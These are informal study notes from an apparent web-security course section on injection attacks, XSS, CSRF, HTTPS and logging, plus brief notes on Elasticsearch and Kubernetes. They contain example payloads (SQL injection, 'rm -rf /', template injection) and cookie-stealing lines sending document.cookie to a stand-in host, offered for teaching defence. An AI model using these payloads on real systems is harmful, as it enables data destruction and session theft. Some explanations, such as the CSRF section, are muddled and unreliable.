# Junior to Senior

## Security

**Injection attacks** are a major web security risk, where attackers supply malicious input that gets executed as code or commands. This can lead to unauthorized access, data breaches, or full system compromise.

---

### Common Injection Attack Types

| Type               | What It Targets             | Example Payload                          | Typical Impact                            |
| ------------------ | --------------------------- | ---------------------------------------- | ----------------------------------------- |
| SQL Injection      | Databases                   | ` ' OR 1=1 --``'; DROP TABLE users; -- ` | Bypass login, steal/alter data, data loss |
| Command Injection  | Operating system commands   | `; rm -rf /`                             | Run arbitrary commands, system takeover   |
| XSS                | User browsers via web pages | `alert('XSS')`                           | Steal cookies, impersonate, deface        |
| LDAP Injection     | Directory services          | `` `\*)(        (user=\*))` ``           | Unauthorized directory access             |
| Template Injection | Template engines            | `{{7*7}}`                                | Remote code execution, data exposure      |

---

### How Attacks Happen

- Attackers exploit code that directly uses user input in queries or commands without validation.
- Example (SQL Injection):
  ```sql
  -- User input manipulates query logic
  sql = "SELECT * FROM users WHERE username = '" + user + "' AND password = '" + pass + "'"
  ```

---

### Real-World Impact

- Major breaches: universities, retailers, tech companies, and more have lost millions of records to injection flaws.

---

### Prevention Tips

- **Validate & Sanitize Inputs:** Only allow expected data types and values; escape special characters[1][6].
- **Parameterized Queries:** Always use prepared statements or ORM methods for database access[4][6].
- **Avoid Dangerous Functions:** Never use `eval()`, `exec()`, or similar on user input[6].
- **Treat All Data as Untrusted:** Validate everything—forms, cookies, headers, files[6].
- **Security Tools:** Regularly scan code and dependencies (e.g., `npm audit`, `snyk test`)[4][7].
- **Static/Dynamic Analysis:** Use code analysis and vulnerability scanners to catch flaws early[6].

---

### Quick Reference: Injection Prevention

| Injection Type     | Main Defense                      |
| ------------------ | --------------------------------- |
| SQL Injection      | Parameterized queries, validation |
| Command Injection  | Input sanitization, avoid shell   |
| XSS                | Output encoding, validation       |
| LDAP Injection     | Parameterized queries, validation |
| Template Injection | Safe template engines, validation |

---

### Logging/moniotoring

system tampering without beiung detected

- able to detect issues quickly

```
npm install winston // monitoring middleware, can also log errors
npm install morgan // monitoring middleware
```

### HTTPS

- SSL + TLS certificates
  information from client to server is secure, encrypted
- HTTP sends information in plain text

**letsencrypt.org**

- get your TLS certificate here
- will prevent most sites from tampering
- easy to set up

**cloudflare**

- HTTPS out of the box
- helps with DDOS

**DDOS**

- when a bunch of computers send multiple requests to the server at the same time
- server could crash - will take down the website

### XSS (Cross Site Scripting)

- used for session hijacking
- when an application includes untrusted data in a new webpage without proper validation or escaping
- allows attacker to execute scripts in a visitor's browser

```
window.location = 'badwebsite.com?cookie = ' + document.cookie (can steal login info using cookie)

```

takes tghe user to a new website

with the cookie, you can log information

- can prevent by sanitizing inputs

### CSRF (Cross Site Request Forgery)

- create a bad URL that has bad ccode in it(scam emails)
- using query parameters and get/post requests(along with cookies)

```
fetch('httpbin.org/post', { method: 'POST', body: document.cookie })
```

prevent using Content-Security Policy in the headers

- allows only the api in the content security policy to make changes
- cookies add extra layer to make things secure

### Preventing XSS and CSRF

- Clientside input validation
- Sanitize inputs
- No `eval()`
- No `document.write()`
- Set Content Security Policy headers
- Set Secure + HTTP only cookies

### What is Elastisearch?

- Elasticsearch is predominantly used for fast, scalable full-text search and real-time analytics on large volumes of data. 
- Its main applications include powering search features for websites and applications, centralized log and event data analysis, infrastructure and application monitoring, security analytics, and business intelligence dashboards. 
- It excels at enabling users to quickly search, retrieve, and analyze structured and unstructured data across diverse use cases, such as e-commerce product search, enterprise document search, and operational monitoring

Netflix: For monitoring, customer service operations, and security logs.

eBay: For text search and analytics across business-critical data.

Walmart: For real-time insights into customer purchasing patterns and store performance

### What is Docker?

### What is Kubernetes?
- Manages and automates the deployment, scaling, networking, and operation of containers across clusters of machines

- Used to run and coordinate many containers (often from Docker or other runtimes) across multiple servers, providing high availability, scaling, and self-healing

Key features:
- Orchestrate and scale containers
- Load balancing, service discovery
- Automated rollouts, monitoring, and self-healing

